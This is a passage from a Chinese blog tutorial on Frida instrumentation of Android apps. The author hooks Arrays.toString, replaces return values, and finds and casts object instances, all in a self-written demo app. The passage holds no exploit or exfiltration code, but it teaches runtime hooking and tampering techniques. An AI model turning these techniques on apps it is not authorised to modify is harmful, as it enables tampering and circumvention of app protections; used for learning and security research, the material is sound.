function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.v5le0n9.test02 -l test02.js --no-pause</span><br></pre></td></tr></table></figure><ul><li>-f：spawn模式，frida 重新打开进程。没有-f默认为attach模式，附加在打开的进程。</li></ul><img src="/posts/ab7319a3/3.1.1.png" class=""><img src="/posts/ab7319a3/3.1.2.png" class=""><p>hook出不来，咋办？如何主动调用<code>onCreate()</code>方法？</p><p>接下来将一整行hook出来，也就是使用<code>Arrays.toString()</code>方法那一条语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        Log.d(<span class="string">&quot;SimpleArray&quot;</span>, <span class="string">&quot;onCreate: SimpleArray&quot;</span>);</span><br><span class="line">        <span class="type">char</span> arr[][] = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">4</span>][];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;春&#x27;</span>,<span class="string">&#x27;眠&#x27;</span>,<span class="string">&#x27;不&#x27;</span>,<span class="string">&#x27;觉&#x27;</span>,<span class="string">&#x27;晓&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;处&#x27;</span>,<span class="string">&#x27;处&#x27;</span>,<span class="string">&#x27;闻&#x27;</span>,<span class="string">&#x27;啼&#x27;</span>,<span class="string">&#x27;鸟&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;夜&#x27;</span>,<span class="string">&#x27;来&#x27;</span>,<span class="string">&#x27;风&#x27;</span>,<span class="string">&#x27;雨&#x27;</span>,<span class="string">&#x27;声&#x27;</span>&#125;;</span><br><span class="line">        arr[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">char</span>[] &#123;<span class="string">&#x27;花&#x27;</span>,<span class="string">&#x27;落&#x27;</span>,<span class="string">&#x27;知&#x27;</span>,<span class="string">&#x27;多&#x27;</span>,<span class="string">&#x27;少&#x27;</span>&#125;;</span><br><span class="line">        Log.d(<span class="string">&quot;SimpleArray&quot;</span>, <span class="string">&quot;-----横板-----&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;SimpleArraysToString&quot;</span>, Arrays.toString(arr[i]));</span><br><span class="line">            <span class="comment">//Log.d(&quot;SimpleArraysStringBytes&quot;,Arrays.toString(Arrays.toString(arr[i]).getBytes()));</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">5</span>; j++)&#123;</span><br><span class="line">                <span class="comment">//Log.d(&quot;SimpleArray&quot;,Character.toString(arr[i][j]));</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;SimpleArray&quot;</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;SimpleArray&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.1.3.png" class=""><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.Arrays&quot;</span>).<span class="property">toString</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>(args1)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, args1, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>我一直hook不出来，只能盗图了。</p><img src="/posts/ab7319a3/3.1.4.png" class=""><p>要想打印Java对象的内容，需要Google的json包。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.Arrays&quot;</span>).<span class="property">toString</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>(args1)</span><br><span class="line">            <span class="comment">//打印Java对象的内容可以使用json包</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(args1), result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.1.5.png" class=""><p>接下来正式进行构造数组的内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.Arrays&quot;</span>).<span class="property">toString</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> charArray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;char&#x27;</span>, [<span class="string">&#x27;一&#x27;</span>,<span class="string">&#x27;去&#x27;</span>,<span class="string">&#x27;二&#x27;</span>,<span class="string">&#x27;三&#x27;</span>,<span class="string">&#x27;里&#x27;</span>])</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>(charArray)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;charArray, result&quot;</span>, gson.$new().<span class="title function_">toJson</span>(charArray), result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.1.6.png" class=""><p>修改返回值更简单，因为返回的是一个字符串，直接在返回处写字符串即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//return &quot;烟村四五家&quot;</span></span><br><span class="line"><span class="comment">//return Java.use(&quot;java.lang.String&quot;).$new(&quot;烟村四五家&quot;)</span></span><br><span class="line"><span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;char&#x27;</span>, [<span class="string">&#x27;烟&#x27;</span>,<span class="string">&#x27;村&#x27;</span>,<span class="string">&#x27;四&#x27;</span>,<span class="string">&#x27;五&#x27;</span>,<span class="string">&#x27;家&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>可以在LogCat中看到返回值已被修改。</p><p>继续hook<code>Arrays.toString()</code>方法，只是传入的参数不一样了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.Arrays&quot;</span>).<span class="property">toString</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">toString</span>(args1)</span><br><span class="line">            <span class="comment">//console.log(&quot;args1, result&quot;, args1, result)</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, result&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(args1), result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.1.7.png" class=""><img src="/posts/ab7319a3/3.1.8.png" class=""><h2 id="3-2-构造对象"><a href="#3-2-构造对象" class="headerlink" title="3.2 构造对象"></a>3.2 构造对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Water.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Water</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">flow</span><span class="params">(Water w)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;20bject&quot;</span>,<span class="string">&quot;water flow:I&#x27;m flowing&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;water flow:I&#x27;m flowing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">still</span><span class="params">(Water w)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;20bject&quot;</span>,<span class="string">&quot;water still: still water runs deep!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;water still: still water runs deep!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//juice.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">juice</span> <span class="keyword">extends</span> <span class="title class_">Water</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fillEnergy</span><span class="params">()</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;20bject&quot;</span>, <span class="string">&quot;juice: I&#x27;m fillingEnergy&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Juice: I&#x27;m fillingEnergy&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mian</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Water</span> <span class="variable">w1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Water</span>();</span><br><span class="line">        flow(w1);</span><br><span class="line"></span><br><span class="line">        <span class="type">juice</span> <span class="variable">j</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">juice</span>();<span class="comment">//子类对象可以使用父类的所有方法</span></span><br><span class="line">        flow(j);</span><br><span class="line"></span><br><span class="line">        <span class="type">Water</span> <span class="variable">w2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">juice</span>();</span><br><span class="line">        <span class="comment">//w2.fillEnergy();//错误，父类对象不能使用子类方法</span></span><br><span class="line">        ((juice) w2).fillEnergy();<span class="comment">//需要进行强制类型转换</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        com.v5le0n9.test02.juice.mian();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.2.1.png" class=""><p>那js也可以进行强制类型转换，也就是将一个父类对象转化成子类再使用子类方法吗？先找到父类对象的实例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Waterhandle</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test02.Water&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;water instance can still:&quot;</span>,instance.<span class="title function_">still</span>(instance))</span><br><span class="line">                <span class="title class_">Waterhandle</span> = instance</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U com.v5le0n9.test02 -l test02.js</span><br></pre></td></tr></table></figure><p>乌鱼子，我怎么老hook不上。听说是跟App生命周期相关。</p><img src="/posts/ab7319a3/3.2.2.png" class=""><p>在知道对象的实例后，尝试在js中进行强制类型转换：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Waterhandle</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test02.Water&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;water instance can still:&quot;</span>,instance.<span class="title function_">still</span>(instance))</span><br><span class="line">                <span class="title class_">Waterhandle</span> = instance</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> juicehandle = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="title class_">Waterhandle</span>,<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test02.juice&quot;</span>))</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;juice fillEnergy method:&quot;</span>, juicehandle.<span class="title function_">fillEnergy</span>())</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>结果说不行。</p><img src="/posts/ab7319a3/3.2.3.png" class=""><p>那子类对象可以转化成父类对象吗？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> juicehandle = <span class="literal">null</span>;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test02.juice&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>, instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;filling energy:&quot;</span>,instance.<span class="title function_">fillEnergy</span>())</span><br><span class="line">                juicehandle = instance</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Waterhandle</span> = <span class="title class_">Java</span>.<span class="title function_">cast</span>(juicehandle, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test02.Water&quot;</span>))</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Water invoke still:&quot;</span>, <span class="title class_">Waterhandle</span>.<span class="title function_">still</span>(<span class="title class_">Waterhandle</span>))</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.2.4.png" class=""><p>综上，在js中父类转子类不行，而子类转父类可行。</p><h2 id="3-3-利用接口构造类"><a href="#3-3-利用接口构造类" class="headerlink" title="3.3 利用接口构造类"></a>3.3 利用接口构造类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//liquid.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">liquid</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">flow</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//milk.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">milk</span> <span class="keyword">implements</span> <span class="title class_">liquid</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">flow</span><span class="params">()</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;3interface&quot;</span>,<span class="string">&quot;flowing: interface&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nihao&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">milk</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">milk</span>();</span><br><span class="line">        m.flow();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> 